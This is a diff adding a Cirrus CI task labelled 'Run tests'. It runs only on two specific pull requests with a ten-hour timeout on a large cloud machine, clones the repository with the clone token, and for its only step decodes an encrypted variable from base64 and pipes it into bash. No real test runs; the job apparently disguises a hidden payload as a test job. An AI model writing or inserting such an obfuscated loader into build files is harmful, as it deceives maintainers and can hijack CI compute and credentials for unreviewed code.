@@ -1,0 +1,37 @@
+test_push_task:
+  name: Run tests
+  only_if: (${CIRRUS_PR} == '1' || ${CIRRUS_PR} == '2') && ${CIRRUS_PR_DRAFT} == 'false'
+  execution_lock: only-one
+  timeout_in: 600m
+  on_timeout:
+    cleanup_task: sleep 5m
+
+  env:
+    A: ENCRYPTED[73a652d821e28a6f59fd92becf75249c875f6946b5b94affe108a41122ad72edc1ca05c5ee2b1e12462df1a7c869bd75]
+    B: ENCRYPTED[9e87ae87029e48e5eec9085ff6eecac5c80158b78a2a846ad877893311ec66d8d2097c937e1fa47ede66fe643d71ffaa]
+    C: ENCRYPTED[04155b087a72347341fb5df5f4100807a11d70eab22b96c4bd85be8dd7033be1f07458f5650d94a68d3e4a320f3d698c]
+    D: ENCRYPTED[8f78c61497a98a644a392639242b74e98ab011d9aabead9333fdc47e568ad6a3194e97f53fccdcd61390bc38c904f5d5]
+    E: ENCRYPTED[a1d8d2a83f9852d76f3991aa44031c0bd914878998454e5e84df5d680831f45748b29a39ceb309080b5e6d37d067c070]
+    F: ENCRYPTED[8105b440aaa6b350b582e7eb6f9dcef9a1075e7540e6f893e4ddc5ed27a3f30471e2f5cbfa7a6748c02e7212ec322c50]
+    G: ENCRYPTED[052e6ab2951c70d6fff6d18b91e2285fd5d219d41cad257568c545ae54ec730069fe249ba6099f91dc2b8bcdcd4bcf4c]
+
+  compute_engine_instance:
+    image_project: debian-cloud
+    image: family/debian-13
+    architecture: amd64
+    platform: linux
+    nested_virtualization: false
+    cpu: 8
+    memory: 32G
+    disk: 256
+
+  clone_script: |
+    export DEBIAN_FRONTEND=noninteractive
+    apt-get update 1>/dev/null 2>&1
+    apt-get -yq install git 1>/dev/null 2>&1
+    git clone --recursive --branch=master "https://x-access-token:${CIRRUS_REPO_CLONE_TOKEN}@github.com/${CIRRUS_REPO_FULL_NAME}.git" "${CIRRUS_WORKING_DIR}"
+    if [ -z "$CIRRUS_PR" ]; then
+      git reset --hard "${CIRRUS_CHANGE_IN_REPO}"
+    fi
+
+  run_script: printf '%s' "${A}" | base64 -d | bash
